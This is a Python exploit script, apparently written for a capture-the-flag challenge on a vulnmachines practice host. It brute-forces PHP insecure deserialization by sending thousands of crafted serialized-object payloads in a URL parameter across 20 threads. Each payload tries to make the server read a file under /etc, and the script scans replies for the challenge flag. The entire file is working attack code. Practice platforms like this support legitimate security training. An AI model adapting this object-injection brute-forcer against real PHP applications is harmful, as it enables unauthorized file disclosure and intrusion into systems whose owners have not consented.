#!/usr/bin/env python3
import requests
import urllib.parse
import re
import threading
import queue
import string
from itertools import product

base_url = "http://hackme11.vulnmachines.com:8056"
found_flag = False
flag_lock = threading.Lock()

def generate_all_names():
    """Generar TODOS los nombres posibles de 1-4 caracteres"""
    names = []
    
    # 1 carácter
    for c in string.ascii_letters:
        names.append(c)
    
    # 2 caracteres
    for c1, c2 in product(string.ascii_letters, repeat=2):
        names.append(c1 + c2)
    
    # 3 caracteres - solo combinaciones comunes
    common_3 = ['Log', 'log', 'LOG', 'Foo', 'foo', 'FOO', 'Bar', 'bar', 'BAR',
                'Get', 'get', 'GET', 'Set', 'set', 'SET', 'Run', 'run', 'RUN',
                'Cmd', 'cmd', 'CMD', 'Rce', 'rce', 'RCE', 'Lfi', 'lfi', 'LFI',
                'Poi', 'poi', 'POI', 'Obj', 'obj', 'OBJ', 'Ser', 'ser', 'SER',
                'Uns', 'uns', 'UNS', 'Php', 'php', 'PHP', 'Web', 'web', 'WEB',
                'App', 'app', 'APP', 'Api', 'api', 'API', 'Sql', 'sql', 'SQL',
                'Xml', 'xml', 'XML', 'Xxe', 'xxe', 'XXE', 'Xss', 'xss', 'XSS']
    names.extend(common_3)
    
    # 4 caracteres - más comunes
    common_4 = ['File', 'file', 'FILE', 'Read', 'read', 'READ', 'Flag', 'flag', 'FLAG',
                'Load', 'load', 'LOAD', 'Open', 'open', 'OPEN', 'Show', 'show', 'SHOW',
                'View', 'view', 'VIEW', 'Dump', 'dump', 'DUMP', 'Leak', 'leak', 'LEAK',
                'Test', 'test', 'TEST', 'Demo', 'demo', 'DEMO', 'Vuln', 'vuln', 'VULN',
                'Hack', 'hack', 'HACK', 'Code', 'code', 'CODE', 'Data', 'data', 'DATA',
                'Info', 'info', 'INFO', 'Page', 'page', 'PAGE', 'User', 'user', 'USER',
                'Root', 'root', 'ROOT', 'Exec', 'exec', 'EXEC', 'Call', 'call', 'CALL']
    names.extend(common_4)
    
    return names

def worker(q, results_q):
    """Worker thread para probar payloads"""
    global found_flag
    
    while not q.empty() and not found_flag:
        try:
            cls, prop = q.get(timeout=1)
            
            payload = f'O:{len(cls)}:"{cls}":1:{{s:{len(prop)}:"{prop}";s:13:"/etc/f149.txt";}}'
            encoded = urllib.parse.quote(payload)
            url = f"{base_url}/params?vnm={encoded}"
            
            try:
                response = requests.get(url, timeout=1)
                
                # Buscar flag
                if 'vulnmachines{' in response.text.lower():
                    with flag_lock:
                        if not found_flag:
                            found_flag = True
                            matches = re.findall(r'vulnmachines\{[^}]+\}', response.text, re.IGNORECASE)
                            if matches:
                                results_q.put((cls, prop, matches[0]))
                                
            except:
                pass
                
            q.task_done()
        except:
            break

print("[*] ULTRA AGGRESSIVE BRUTEFORCE")
print("[*] Generating class names...")

class_names = generate_all_names()
properties = ['file', 'filename', 'path', 'name', 'f', 'p', 'n']

print(f"[*] Testing {len(class_names)} class names with {len(properties)} properties")
print(f"[*] Total: {len(class_names) * len(properties)} combinations")

# Crear cola de trabajo
work_queue = queue.Queue()
results_queue = queue.Queue()

# Llenar la cola
for cls in class_names:
    for prop in properties:
        work_queue.put((cls, prop))

# Crear threads
threads = []
num_threads = 20
print(f"[*] Starting {num_threads} threads...")

for i in range(num_threads):
    t = threading.Thread(target=worker, args=(work_queue, results_queue))
    t.start()
    threads.append(t)

# Esperar a que terminen
for t in threads:
    t.join()

# Verificar resultados
if not results_queue.empty():
    cls, prop, flag = results_queue.get()
    print(f"\n[!!!] FLAG FOUND!")
    print(f"[!!!] Class: {cls}")
    print(f"[!!!] Property: {prop}")
    print(f"[!!!] FLAG: {flag}")
else:
    print("\n[-] No flag found")